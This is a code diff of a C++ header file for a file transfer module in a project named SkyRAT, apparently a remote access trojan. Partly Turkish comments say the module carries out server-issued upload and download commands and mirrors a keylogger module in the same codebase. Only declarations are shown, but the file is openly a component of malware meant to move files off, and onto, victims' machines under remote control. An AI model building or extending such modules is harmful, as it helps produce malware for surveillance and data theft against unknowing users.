@@ -1,109 +1,70 @@
 #pragma once
 
-// Proje yapısına uygun dahil edilen başlık dosyaları
-#include "../IModule.h" 
-#include "../../Utils/Logger.h" 
-#include "../../Network/MessageProtocol.h" // msgpack için gerekli
+#include "../Imodule.h"
+#include "../../Utils/Logger.h"
+#include <windows.h>
 #include <string>
+#include <memory>
+#include <atomic>
 #include <thread>
 #include <functional>
-#include <atomic>
+#include <fstream>
 #include <mutex>
-#include <filesystem>
-#include <winsock2.h> // SOCKET tipi için
-
-namespace fs = std::filesystem;
-
-// --- Cross-Platform Socket Definitions (Orijinal dosyanızdan alındı) ---
-#ifdef _WIN32
-    // Windows için gerekli
-    #include <ws2tcpip.h>
-    #pragma comment(lib, "ws2_32.lib")
-    typedef SOCKET SocketType;
-    #define CLOSE_SOCKET closesocket
-#else
-    // Linux/Diğerleri için gerekli
-    #include <sys/socket.h>
-    #include <netinet/in.h>
-    #include <arpa/inet.h>
-    #include <unistd.h>
-    typedef int SocketType;
-    #define INVALID_SOCKET -1
-    #define SOCKET_ERROR -1
-    #define CLOSE_SOCKET close
-#endif
-// ---------------------------------------------------------------------------------
-
 
 namespace SkyRAT {
 namespace Modules {
 namespace Implementations {
 
 /**
- * @brief Cross-platform module for file data transfer (Client Mode).
+ * @brief Module for cross-platform file data transfer (Upload/Download via sockets).
  */
 class DataTransferModule : public IModule {
 public:
-    /// Progress callback type (percentage, transferred bytes, total bytes)
-    using ProgressCallback = std::function<void(int, long long, long long)>;
-
     DataTransferModule();
     virtual ~DataTransferModule();
 
-    // --- IModule Interface Implementation (Keylogger ile aynı) ---
-    std::string getName() const override { return "DataTransferModule"; }
-    std::string getVersion() const override { return "1.0.0"; }
+    // IModule interface
+    std::string getName() const override;
+    std::string getVersion() const override;
     bool initialize() override;
     void shutdown() override;
     bool isRunning() const override;
-    bool start(SOCKET socket) override; // Server'dan gelen ilk socket (Kullanmayacağız)
+    bool start(SOCKET socket) override;         // Start as client
     bool stop() override;
-    
-    // Komut işleme (Server'dan gelen UPLOAD, DOWNLOAD komutlarını işler)
     bool processCommand(const std::string& command, SOCKET socket) override;
     std::string getStatus() const override;
     bool canHandleCommand(const std::string& command) const override;
     bool executeCommand(const std::string& command, const std::vector<std::string>& arguments, SOCKET socket) override;
     std::vector<std::string> getSupportedCommands() const override;
-    // ----------------------------------------
 
-private:
-    // --- Core Client API Functions (Orijinal dosyanızdan uyarlanmıştır) ---
-    bool connectToServer(const std::string& ip, int port);
+    // High-level APIs (for upload/download)
     bool uploadFile(const std::string& localPath, const std::string& remoteName = "");
     bool downloadFile(const std::string& remoteName, const std::string& localPath = "");
-    void disconnect(); 
-    void setProgressCallback(ProgressCallback callback);
+    void setProgressCallback(std::function<void(int, long long, long long)> callback);
 
-    // --- Private State and Helpers ---
-    static constexpr size_t BufferSize = 8192;
-    static constexpr size_t MAX_FILE_SIZE = 10ULL * 1024 * 1024 * 1024;
-    
-    // Socket İşlemleri
-    bool sendAll(SocketType sock, const char* data, size_t length);
-    bool recvAll(SocketType sock, char* buffer, size_t length);
-    
-    // Yardımcılar
-    void notifyProgress(int percentage, long long transferred, long long total);
-    std::string sanitizeFileName(const std::string& fileName);
-    bool isInitialized() const;
-    int getLastError() const;
-    
-    // State Variables
-    std::atomic<bool> isConnected_{false};     
-    std::atomic<bool> isTransferring_{false};
-    std::atomic<bool> shouldStop_{false};      
-    
-    SocketType clientSocket_{INVALID_SOCKET};  // Ayrı bağlantı için kullanılan socket
-    
+private:
+    // State
+    std::atomic<bool> m_isRunning;
+    std::atomic<bool> m_shouldStop;
+    std::atomic<bool> m_isTransferring;
     std::shared_ptr<Utils::Logger> m_logger;
-    ProgressCallback progressCallback_;
-    std::mutex callbackMutex_;
-    
-#ifdef _WIN32
-    WSADATA wsaData_;
-    bool wsaInitialized_ = false;
-#endif
+    std::unique_ptr<std::thread> m_transferThread;
+    SOCKET m_socket;
+    std::mutex m_callbackMutex;
+    std::function<void(int, long long, long long)> m_progressCallback;
+
+    std::string m_transferStatus;
+    std::string m_lastError;
+    std::string m_logFileName;
+
+    // Internal helpers
+    void transferThreadFunction();
+    bool sendAll(const char* data, size_t length);
+    bool recvAll(char* buffer, size_t length);
+
+    // Utility
+    std::string sanitizeFileName(const std::string& fileName);
+    void notifyProgress(int percent, long long transferred, long long total);
 };
 
 } // namespace Implementations
